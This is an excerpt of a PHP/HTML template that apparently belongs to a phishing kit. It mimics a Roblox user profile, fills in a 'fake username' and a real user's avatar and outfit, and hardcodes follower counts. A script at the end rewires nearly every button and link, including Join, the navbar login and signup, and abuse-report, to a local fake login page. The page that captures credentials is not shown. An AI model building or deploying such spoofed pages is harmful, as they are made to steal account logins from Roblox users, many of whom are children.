...
$rusername = htmlspecialchars(file_get_contents('setup/realusername.txt'));
$fusername = htmlspecialchars(file_get_contents('setup/fakeusername.txt'));
$aboutme = htmlspecialchars(file_get_contents('setup/aboutme.txt'));
$l = htmlspecialchars(file_get_contents('setup/friends.txt'));
$link = htmlspecialchars(file_get_contents('setup/link.txt'));
...
$output = curl_exec($ch);
preg_match('/"imageUrl":"(.*?)"/', $output, $matches);
$thumbnail = isset($matches[1]) ? $matches[1] : '';
function getWearing($userid) {
    $jid = json_decode(file_get_contents("https://avatar.roblox.com/v1/users/$userid/currently-wearing"));
    $total = $jid->assetIds;
    ...
    if (is_array($total)) {
        ...
        while ($i < $length) {
            echo '<li class="accoutrement-item" ng-non-bindable="">
                <a href="https://www.roblox.com/catalog/'.$total[$i].'"> 
                    <img title="" class="accoutrement-image" 
                    src="https://www.roblox.com/asset-thumbnail/image?assetId='.$total[$i].'&width=420&height=420&format=png">
                ...
                <ul class="details-info">
                    <li>
                        ...
                        <a class="text-name" href="https://www.roblox.com/users/3524148282/friends#!/friends">
                            <span class="font-header-2 ng-binding" title="<?php echo $friends ?>" ng-bind="profileHeaderLayout.friendsCount | abbreviate"><?php echo $friends ?></span>
                        </a>
                    </li>
                    <li>
                        ...
                        <a class="text-name" href="https://www.roblox.com/users/3524148282/friends#!/followers">
                            <span class="font-header-2 ng-binding" title="8,183" ng-bind="getAbbreviatedStringFromCountValue(profileHeaderLayout.followersCount)">8,183</span>
                        </a>
                    </li>
                    <li>
                        ...
                        <a class="text-name" href="https://www.roblox.com/users/3524148282/friends#!/following">
                            <span class="font-header-2 ng-binding" title="18,472" ng-bind="getAbbreviatedStringFromCountValue(profileHeaderLayout.followingsCount)">18,472</span>
                        </a>
                    </li>
                </ul>
...
<li class="btn-messages" id="profile-message-btn">
                        ...
                        <!-- ngIf: profileHeaderLayout.canBeFollowed --><li class="btn-join-game ng-scope" ng-if="profileHeaderLayout.canBeFollowed">
                            <button onclick="location.replace('/login?returnUrl=<?php echo $link ?>')" class="profile-join-game btn-growth-md ng-binding" ng-bind="'Action.JoinGame' | translate">Join</button>
...
<div class="section profile-statistics"><div class="container-header"><h3>Statistics</h3></div><div class="section-content"><ul class="profile-stats-container"><li class="profile-stat"><p class="text-label">Join Date</p><p class="text-lead">9/11/2022</p></li><li class="profile-stat"><p class="text-label">Place Visits</p><p class="text-lead">0</p></li></ul></div></div>
    ...
    <div class="game-card-container">
        <a href="https://www.roblox.com/games/refer?PlaceId=9547174514&amp;Position=1&amp;PageType=Profile" class="game-card-link">
            <div class="game-card-thumb-container">
                    <img class="game-card-thumb ng-isolate-scope" data-="" src="https://t7.rbxcdn.com/9dee4f0319214fd9c659539564d55195" alt="<?=$fusername?>'s Place" thumbnail="{&quot;Final&quot;:true,&quot;Url&quot;:&quot;https://t7.rbxcdn.com/9dee4f0319214fd9c659539564d55195&quot;,&quot;RetryUrl&quot;:null,&quot;UserId&quot;:0,&quot;EndpointType&quot;:&quot;Avatar&quot;}" image-retry="">
            </div>
        ...
        <div id="games-switcher" class="switcher slide-switcher games ng-isolate-scope" ng-hide="isGridOn" switcher="" itemscount="switcher.games.itemsCount" currpage="switcher.games.currPage">
                    ...
                    <li class="switcher-item slide-item-container active" ng-class="{'active': switcher.games.currPage == 0}" data-index="0">
                        <div class="col-sm-6 slide-item-container-left">
                            ...
                            <img class="slide-item-image ng-isolate-scope" src="https://t7.rbxcdn.com/9dee4f0319214fd9c659539564d55195" data-src="https://t7.rbxcdn.com/9dee4f0319214fd9c659539564d55195" data-emblem-id="9547174514" thumbnail="{&quot;Final&quot;:true,&quot;Url&quot;:&quot;https://t7.rbxcdn.com/9dee4f0319214fd9c659539564d55195&quot;,&quot;RetryUrl&quot;:null,&quot;UserId&quot;:0,&quot;EndpointType&quot;:&quot;Avatar&quot;}" image-retry="">
                            ...
                            <div class="slide-item-stats">
                                <ul class="hlist">
                                    ...
                                    <li class="list-item">
                                        ...
                                        <!-- ngIf: !appMeta.isI18nEnabled -->
                                        <div class="text-lead text-overflow slide-item-my-rank games">0</div>
                                    </li>
                                </ul>
                            </div>
                        </div>
...
loginroblox('rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item', '/login?returnUrl=<?php echo $link ?>');
loginroblox('btn-secondary-xs btn-more see-all-link-icon ng-binding', '/login?returnUrl=<?php echo $link ?>');
loginroblox('btn-min-width btn-secondary-xs btn-more inventory-link see-all-link-icon ng-binding', '/login?returnUrl=<?php echo $link ?>');
loginroblox('btn-secondary-xs btn-min-width btn-more see-all-link-icon', '/login?returnUrl=<?php echo $link ?>');
loginroblox('btn-fixed-width btn-secondary-xs btn-more see-all-link-icon', '/login?returnUrl=<?php echo $link ?>');
loginroblox('text-link friend-link ng-isolate-scope', '/login?returnUrl=<?php echo $link ?>');
loginroblox('text-name', 'login');
loginroblox('abuse-report-link abuse-report-modal', '/login?returnUrl=<?php echo $link ?>');
loginroblox('rbx-navbar-signup btn-growth-sm nav-menu-title signup-button', '/login?returnUrl=<?php echo $link ?>');
loginroblox('navbar-brand', '/login?returnUrl=<?php echo $link ?>');
loginroblox('btn-control-md disabled ng-binding ng-scope', '/login?returnUrl=<?php echo $link ?>');
},1)
</script>
